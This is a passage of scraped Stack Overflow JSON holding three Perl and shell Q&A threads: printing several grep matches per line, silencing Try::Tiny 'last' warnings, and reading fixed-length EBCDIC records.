"https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 4, "last_activity_date": 1496376186, "last_edit_date": 1496376186, "creation_date": 1496351604, "answer_id": 44317168, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line/44317168#44317168", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p>With GNU awk for <code>FPAT</code>:</p>\n\n<pre><code>$ awk -v FPAT='\\\\&lt;[Tt]hey?\\\\&gt;' '{$1=$1}1' file\nThe\nThe They\nThey The\nThey the\nThe the they\n</code></pre>\n\n<p>Note that that can't NOT identify <code>They</code> when it appears in <code>They're</code>. If that's really an issue and you want to look for space-separated complete strings then this might be what you want:</p>\n\n<pre><code>$ awk '{c=0; for (i=1;i&lt;=NF;i++) if ($i ~ /^[Tt]hey?$/) printf \"%s%s\", (c++?OFS:\"\"), $i; print \"\"}' file\nThe\nThe They\nThey The\nthe\nThe the they\n</code></pre>\n\n<p>If not, let us know.</p>\n\n<p>The above was run against this iteration of the OPs posted sample input:</p>\n\n<pre><code>$ cat file\nThe Sun\nThunder The Rain They say\nThey say The dance\nThey're dancing with them in the dorm\nThe sun is shining the east and they scream.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13757, "user_id": 1270003, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/d5ed9123b92a6e4dffa75f9f6dd9e382?s=128&d=identicon&r=PG&f=1", "display_name": "texasbruce", "link": "https://stackoverflow.com/users/1270003/texasbruce"}, "edited": false, "score": 0, "creation_date": 1496361419, "post_id": 44317926, "comment_id": 75643101, "body": "Perl magic again.. What does // do? Where can I find the reference?"}, {"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496364809, "post_id": 44317926, "comment_id": 75643839, "body": "The <code>&#47;&#47;</code> defines a regex in Perl. Read more <a href=\"https://perldoc.perl.org/perlre.html\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "edited": false, "score": 0, "creation_date": 1496377420, "post_id": 44317926, "comment_id": 75646591, "body": "@cbmckay Can you please suggest about the exact match words condition? considering &lt;The&gt; and &lt;They&gt; separately. And something like The|They kind of stuff different words."}], "tags": [], "owner": {"reputation": 456, "user_id": 3054046, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ajViR.png?s=128&g=1", "display_name": "cbmckay", "link": "https://stackoverflow.com/users/3054046/cbmckay"}, "is_accepted": true, "score": 3, "last_activity_date": 1496384126, "last_edit_date": 1496384126, "creation_date": 1496355301, "answer_id": 44317926, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line/44317926#44317926", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p>Best do it with Perl: </p>\n\n<pre><code>~$ perl -nE 'say /They? /g' File1\nThe\nThe They\nThey The\n</code></pre>\n\n<p><strong>EDIT</strong> : Add new conditions. The regex still matches all but the lowercase <code>the</code>. Adding the <code>i</code> flag makes the match case-insensitive and matches all your test strings. </p>\n\n<pre><code>$ perl -nE 'say /They? /ig' File1\nThe\nThe They\nThey The\nthe\nThe the they\n</code></pre>\n\n<p>There is a little bit of a trick here: the match also picks up the space after the <code>?</code> and prints it in the output. E.g. the first line of output is realy: \"The_\\n\" - where \"_\" = space character. This may or may not be acceptable. One way to remove the spaces and reassemble the string would be: </p>\n\n<pre><code>$ perl -nE 'say join \" \", map {substr $_,0,-1} /They? /ig' File1\n</code></pre>\n\n<p>As to your question about matching full words &lt;The> and &lt;They>, as you put it, the <code>?</code> in <code>They?</code> indicates that the 'y' is optional. I.e. matches 0 or 1 times. Therefore the pattern is considering 'The' and 'They' as full words, one or the other, followed by a space. You could rewrite the pattern as:</p>\n\n<pre><code>$ perl -nE 'say /(?:They|The) /ig' File1\n</code></pre>\n\n<p>And effect the same output.</p>\n\n<p>Now that you are considering lowercase <code>the</code> you may run into more edge case \"gotchas\" like words that end in \"the\". \"loathe\" and \"tythe\" come to mind.</p>\n\n<pre><code>$ echo \"I'm loathe to cringe and tythe socks\" &gt;&gt; File1\n$ perl -nE 'say /They? /ig' File1\nThe\nThe They\nThey The\nthe\nThe the they\nthe the  &lt;--- not wanted!\n</code></pre>\n\n<p>You can then add the <code>\\b</code> test in to match on word boundaries (as in zdim's answer):</p>\n\n<pre><code>$ perl -nE 'say /\\bThey? /ig' File1\nThe\nThe They\nThey The\nthe\nThe the they\n              &lt;-- But you get this empty line where no match occurs\n</code></pre>\n\n<p>So to refine further, you could only print if the line matches. Like this:</p>\n\n<pre><code>$ perl -nE 'say /\\bThey? /ig if /\\bThey? /i' File1\nThe\nThe They\nThey The\nthe\nThe the they\n</code></pre>\n\n<p>Then, I'm sure, you can find more edge cases that will blow it all up and force further refinement.</p>\n"}, {"comments": [{"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496360370, "post_id": 44318527, "comment_id": 75642822, "body": "Suggest <code>perl -wnE &#39;say join &quot; &quot;,&#47;\\bThey?\\b&#47;g&#39;</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496361404, "post_id": 44318527, "comment_id": 75643097, "body": "@dawg  Right, much better. Plus I needed it at another place as well. Thank you!"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496384383, "post_id": 44318527, "comment_id": 75649136, "body": "@Linguist I updated (at the end) to your comments and edit. I am still not sure that I got your requirements, please clarify if not."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1496384510, "last_edit_date": 1496384510, "creation_date": 1496359300, "answer_id": 44318527, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line/44318527#44318527", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p>Things are not fully specified so here are a couple of possibilities</p>\n\n<ul>\n<li><p>To catch all words starting with <code>The</code>, and print them with a space in between</p>\n\n<pre><code>perl -wnE'say join \" \", /\\bThe\\w*/g' file\n</code></pre>\n\n<p>where <code>\\b</code> is a word-boundary, a zero-width <a href=\"http://perldoc.perl.org/perlreref.html#ANCHORS\" rel=\"nofollow noreferrer\">anchor</a>, and <code>\\w</code> is a word character. Using <code>\\S</code> (a non-space character) is yet more permissive.  </p></li>\n<li><p>For only <code>The</code> or <code>They</code> can instead use</p>\n\n<pre><code>perl -wnE'say join \" \", /\\bThey?\\b/g' file\n</code></pre>\n\n<p>where <code>y?</code> makes <code>y</code> optional.</p></li>\n</ul>\n\n<p>To allow <code>the</code> as well use <code>[tT]</code> instead of <code>T</code> in the pattern, or <code>/i</code> for either case for all chars.</p>\n\n<hr>\n\n<p>It's been clarified in coments that punctuation after <code>The|They</code> isn't allowed, and that low case <code>t</code> is. Then we need to constrain the match by space, not word boundary, and use <code>[tT]</code> as mentioned</p>\n\n<pre><code>perl -wnE'say join \" \", /\\b([Tt]hey?)\\s/g'  file\n</code></pre>\n\n<p>Now the capturing parenthesis <code>()</code> are needed since <code>\\s</code> does consume, unlike <code>\\b</code> before.</p>\n\n<p>This prints the desired output with the provided input.</p>\n"}, {"comments": [{"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1496365457, "post_id": 44319293, "comment_id": 75643998, "body": "Matches anything containing <code>The</code> like <i>Therefor</i> and <i>daTheum</i> and <i>Theater</i>"}, {"owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "edited": false, "score": 0, "creation_date": 1496377259, "post_id": 44319293, "comment_id": 75646535, "body": "@RavinderSingh13 : If a line does not contain any single matched words, then it do deletes all the unmatched string and hence empty line. How to avoid the empty line print? It would be good if empty line is not printed at all."}], "tags": [], "owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "is_accepted": false, "score": 1, "last_activity_date": 1496365236, "creation_date": 1496365236, "answer_id": 44319293, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line/44319293#44319293", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p>try one more awk:</p>\n\n<pre><code>awk '{while(match($0,/The|They/)){string=substr($0,RSTART,RLENGTH);VAL=VAL?VAL OFS string:string;$0=substr($0,RSTART+RLENGTH+1);};print VAL;VAL=\"\"}'   Input_file\n</code></pre>\n\n<p>NON-ONE line form of solution as follows too.</p>\n\n<pre><code>awk '{\n        while(match($0,/The|They/)){\n                                        string=substr($0,RSTART,RLENGTH);\n                                        VAL=VAL?VAL OFS string:string;\n                                        $0=substr($0,RSTART+RLENGTH+1);\n                                   };\n        print VAL;\n        VAL=\"\"\n     }\n    '   Input_file\n</code></pre>\n\n<p>Will add the explanation shortly for same.</p>\n"}], "owner": {"reputation": 123, "user_id": 4192446, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/55c3618a41fa03c51b55fef9e95c9c27?s=128&d=identicon&r=PG&f=1", "display_name": "Linguist", "link": "https://stackoverflow.com/users/4192446/linguist"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 867, "favorite_count": 1, "accepted_answer_id": 44317926, "answer_count": 5, "score": 1, "last_activity_date": 1496384510, "creation_date": 1496349055, "last_edit_date": 1592644375, "question_id": 44316592, "link": "https://stackoverflow.com/questions/44316592/can-grep-or-sed-show-only-words-that-match-multiple-search-patterns-in-a-line", "title": "Can grep or sed show only words that match multiple search patterns in a line?", "body": "<p>I am wondering, if one can print the matched strings as it is in each line... using grep or sed?</p>\n<h1>TestCase1: File1 contains below text</h1>\n<pre><code>The Sun\nThunder The Rain They say\nThey say The dance\n</code></pre>\n<p>If I use this command:</p>\n<pre><code>egrep -o 'The|They' File1\n</code></pre>\n<p>The output I get is:</p>\n<pre><code>The\nThe\nThey\nThey\nThe\n</code></pre>\n<p>But, my expected output should be as below:</p>\n<pre><code>The\nThe They\nThey The\n</code></pre>\n<p>I am aware that, In grep the option -o, --only-matching prints only the matched non-empty) parts of a matching line, with each such part on a separate output line.</p>\n<p>Edit: Please also suggest, if one wants to have a filter with exact word match with multiple match strings</p>\n<pre><code> i.e. &lt;The&gt; and &lt;They&gt; exact word match? Space separated words simply.\n</code></pre>\n<h1>TestCase2: File2 contains below text</h1>\n<pre><code>The Sun\nThunder The Rain They say\nThey say The dance\nThey're dancing with them in the dorm\nThe sun is shining the east and they scream.\n</code></pre>\n<p>Output is:</p>\n<pre><code>The\nThe They\nThey the\nthe\nThe the they\n</code></pre>\n<p>How to approach this?</p>\n"}, {"tags": ["perl", "module", "runtime", "try-catch"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496322186, "post_id": 44308037, "comment_id": 75621851, "body": "Are you sure they are not from code you wrote, or that is in your own code base?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496322269, "post_id": 44308037, "comment_id": 75621920, "body": "<a href=\"https://grep.metacpan.org/search?size=20&amp;q=via+last&amp;qd=&amp;qft=\" rel=\"nofollow noreferrer\">grep.metacpan.org/&hellip;</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496324732, "post_id": 44308037, "comment_id": 75623831, "body": "I think they are from something. But I don&#39;t fully understand this yet."}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496335438, "post_id": 44308037, "comment_id": 75631538, "body": "sorry simbabque the code is quite long now and I didn&#39;t paste everything on purpose, but I had a label called ACTION: on top of a higher loop (not shown here), thanks btw, it&#39;s solved with tjd&#39;s solution, even if it&#39;s not a good idea to hide warnings, I can hide &quot;just the warning I want&quot; :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496352578, "post_id": 44308037, "comment_id": 75640527, "body": "Oh I see it now. Sorry. The call to last is in the block for try, which is not a block but an anonymous sub. That&#39;s why it complains. You need to set a variable that&#39;s scoped outside the try and use it to trigger last below the try."}, {"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496401943, "post_id": 44308037, "comment_id": 75659076, "body": "I get it, thanks for the information, I will try that !"}], "answers": [{"tags": [], "owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "is_accepted": true, "score": 6, "last_activity_date": 1496335545, "last_edit_date": 1496335545, "creation_date": 1496327517, "answer_id": 44310352, "question_id": 44308037, "link": "https://stackoverflow.com/questions/44308037/avoiding-warnings-in-perl-when-using-try-catch-using-trytiny-and-modulerunti/44310352#44310352", "title": "avoiding warnings in Perl when using try-catch using Try::Tiny and Module::Runtime", "body": "<p>In <a href=\"https://perldoc.perl.org/perldiag.html#Exiting-eval-via-%s\" rel=\"nofollow noreferrer\"><code>perldoc perldiag</code></a> we find that those warnings are in a group named \"exiting\".</p>\n\n<p>If you used <code>no warnings \"exiting\";</code> just prior to line 130 in fftgv2.pl, you would silence the warnings for the remainder of that block.</p>\n\n<p>... of course paying attention to the warnings wouldn't be the worst idea either.</p>\n"}, {"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 4, "last_activity_date": 1518538027, "last_edit_date": 1592644375, "creation_date": 1496414627, "answer_id": 44331631, "question_id": 44308037, "link": "https://stackoverflow.com/questions/44308037/avoiding-warnings-in-perl-when-using-try-catch-using-trytiny-and-modulerunti/44331631#44331631", "title": "avoiding warnings in Perl when using try-catch using Try::Tiny and Module::Runtime", "body": "<p>The warnings are issued because you've got a <code>last</code> inside the block of a <code>try</code> statement. The <code>try</code> is not actually part of the Perl syntax. It's not a keyword, and as such, the block is not really a block. It's just an anonymous sub that's treated like a block because of the prototype <code>sub try (&amp;;@)</code> in Try::Tiny.</p>\n<p>We're going to look at it from the bottom up.</p>\n<blockquote>\n<pre><code>Exiting subroutine via last at ./bin/fftgv2.pl line 130. ^\nExiting eval via last at ./bin/fftgv2.pl line 130.       |\nExiting subroutine via last at ./bin/fftgv2.pl line 130. |\n</code></pre>\n<p>Exiting subroutine via last at ./bin/fftgv2.pl line 130.</p>\n</blockquote>\n<p>So the third warning is actually from the sub for your <code>try</code>.</p>\n<pre><code>try {                      # here\n        no strict 'refs';\n</code></pre>\n\n<blockquote>\n<p>Exiting eval via last at ./bin/fftgv2.pl line 130.</p>\n</blockquote>\n<p>The next one is because Try::Tiny <a href=\"https://metacpan.org/source/ETHER/Try-Tiny-0.28/lib/Try/Tiny.pm#L94\" rel=\"nofollow noreferrer\">implements <code>try</code> via a call to <code>eval</code></a>, <a href=\"http://perldoc.perl.org/functions/eval.html\" rel=\"nofollow noreferrer\">Perl's built-in way of catching errors</a>.</p>\n<p>This is the code Try::Tiny uses (highlighted comment mine):</p>\n<blockquote>\n<pre><code>  # failed will be true if the eval dies, because 1 will not be returned\n  # from the eval body\n  my $failed = not eval {              # here is 2)\n    $@ = $prev_error;\n \n    # evaluate the try block in the correct context\n    if ( $wantarray ) {\n      @ret = $try-&gt;();                 # and this is 3)\n    } elsif ( defined $wantarray ) {\n      $ret[0] = $try-&gt;();\n    } else {\n      $try-&gt;();\n    };\n \n    return 1; # properly set $failed to false\n  };\n</code></pre>\n</blockquote>\n\n<blockquote>\n<p>Exiting subroutine via last at ./bin/fftgv2.pl line 130.</p>\n</blockquote>\n<p>And the first warning is from the actual <code>sub try</code> in Try::Tiny itself.</p>\n<hr />\n<p>So what can you do about it? If you don't want to just hide the warnings, you need to rewrite your code a little. Get rid of the <code>last</code> inside of the <code>try</code> block, and instead either make it exit via a <code>die</code>, or simply <code>return</code>. Remember, it's a function after all.</p>\n<p>Then set a value that you use later to decide if you want to skip the iteration or not.</p>\n<pre><code>ACTION: foreach my $action_name (@foo) {\n    my $break_out;\n    try {\n        no strict 'refs';\n        require_module $modules{$action_name};\n        if ( &amp;{&quot;FFTG::${actiontype}::run&quot;}( $action, $fs, $log ) ) {\n            $log-&gt;res(&quot;SUCCESS&quot;);\n        }\n        else {\n            if ( $action-&gt;{mandatory}[0] == 1 ) {\n                $log-&gt;res(&quot;FAIL, exiting.&quot;);\n                return $break_out = 1; # use this to exit the loop later\n            }\n            else {\n                $log-&gt;res(&quot;FAIL, but not mandatory, continuing..&quot;);\n            }\n            # return is only needed if there is more code here ...\n        }\n        # ... or here\n    }\n    catch {\n        $log-&gt;res(&quot;MODULE NOT FOUND&quot;);\n        print &quot;no module found for action '$actiontype', unable to process this action\\n&quot;;\n    };\n\n    last ACTION if $break_out; # oops, something went wrong, break out\n}\n</code></pre>\n"}], "owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 440, "favorite_count": 0, "accepted_answer_id": 44310352, "answer_count": 2, "score": 2, "last_activity_date": 1518538027, "creation_date": 1496321392, "last_edit_date": 1496338273, "question_id": 44308037, "link": "https://stackoverflow.com/questions/44308037/avoiding-warnings-in-perl-when-using-try-catch-using-trytiny-and-modulerunti", "title": "avoiding warnings in Perl when using try-catch using Try::Tiny and Module::Runtime", "body": "<p>I have this code currently in a part of my perl script (working fine) :</p>\n\n<pre><code>try {\n        no strict 'refs';\n        require_module $modules{$action_name};\n        if ( &amp;{\"FFTG::${actiontype}::run\"}( $action, $fs, $log ) ) {\n                $log-&gt;res(\"SUCCESS\");\n        } else {\n                if ( $action-&gt;{mandatory}[0] == 1 ) {\n                        $log-&gt;res(\"FAIL, exiting.\");\n                        last ACTION;\n                } else {\n                        $log-&gt;res(\"FAIL, but not mandatory, continuing..\");\n                }\n        }\n}\ncatch {\n        $log-&gt;res(\"MODULE NOT FOUND\");\n        print \"no module found for action '$actiontype', unable to process this action\\n\";\n        #warn $_;\n};\n</code></pre>\n\n<p>but unfortunately, the output of the script shows these 3 errors in the middle of the output (all lines beginning with <strong>Exiting subroutine</strong>):</p>\n\n<pre><code>starting transfer ..\nno module found for action 'Transfer', unable to process this action\nno module found for action 'Transfer', unable to process this action\nno module found for action 'Archive', unable to process this action\nExiting subroutine via last at ./bin/fftgv2.pl line 130.\nExiting eval via last at ./bin/fftgv2.pl line 130.\nExiting subroutine via last at ./bin/fftgv2.pl line 130.\nending transfer\n</code></pre>\n\n<p>even if the script works perfectly, I find it \"dirty\" to display these errors on the standard output.</p>\n\n<p>is there a way to get rid of them ?\n(I cannot use if/then etc.. because I don't want the script to exit with this require_module thing).\nI just want my script to display an alert if it cannot find a module (it does), but not these warnings</p>\n\n<p>thanks again\nregards</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496313181, "post_id": 44305003, "comment_id": 75615364, "body": "Do you know the encoding of the file? Do you know the characters per record, or the bytes per record?"}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496389269, "post_id": 44305003, "comment_id": 75651640, "body": "The file in EBCDIC format with packed decimals. Well I am dealing with bytes and I am referring to 1 byte = 1 character. Hope that&#39;s what you&#39;re looking for."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496389763, "post_id": 44305003, "comment_id": 75651918, "body": "That should work, I guess. Otherwise you&#39;d need to set the encoding when opening the file. Both Sobrique&#39;s and my answer should work for you."}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496394536, "post_id": 44305003, "comment_id": 75654630, "body": "I will be adding another option to my question. I am hoping you can give me some feedback. Thanks :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496396031, "post_id": 44305003, "comment_id": 75655507, "body": "The <code>while</code> loop is no different from your first option, just that it would read more than one line. But if there is only one, you essentially have the same thing."}], "answers": [{"comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1496313836, "post_id": 44305245, "comment_id": 75615830, "body": "When <code>$&#47;</code> is scalar ref, does it respect file encoding?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1496314394, "post_id": 44305245, "comment_id": 75616235, "body": "@\u0421\u0443\u0445\u043e\u043927 I don&#39;t know. Using <code>$&#47;</code> instead of <code>read</code> is an alternative. <a href=\"http://perldoc.perl.org/perlvar.html#%24%2f\" rel=\"nofollow noreferrer\">perldoc.perl.org/perlvar.html#%24%2f</a> says it needs the system to understand record-oriented files. I have no idea what that means. <code>local $&#47; = 3; say while (&lt;DATA&gt;);</code> works for my example on my machine. You should add that as an answer. It&#39;s the more Perlish way to do this."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1496314542, "post_id": 44305245, "comment_id": 75616334, "body": "@\u0421\u0443\u0445\u043e\u043927 I tried with setting <code>DATA</code> to <code>\u0532\u0561\u0580\u0565\u0582 \u0561\u0577\u056d\u0561\u0580\u0570</code> and then reading with the example from the above comment with and without <code>use utf8</code>. Without, it breaks the Armenian chars into bytes. With <code>use utf8</code> it reads and prints them correctly (but throws wide character warnings because STDOUT is not utf8)."}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 0, "creation_date": 1496395513, "post_id": 44305245, "comment_id": 75655206, "body": "This is probably the closest on what I am looking for. :)"}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 0, "creation_date": 1496402609, "post_id": 44305245, "comment_id": 75659508, "body": "I tried this but I am having problems when reading each record. I believe that there are some part of my data getting treated as multibyte utf-8 so it does not capture only 25 bytes. I have set use utf8 in my code."}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": 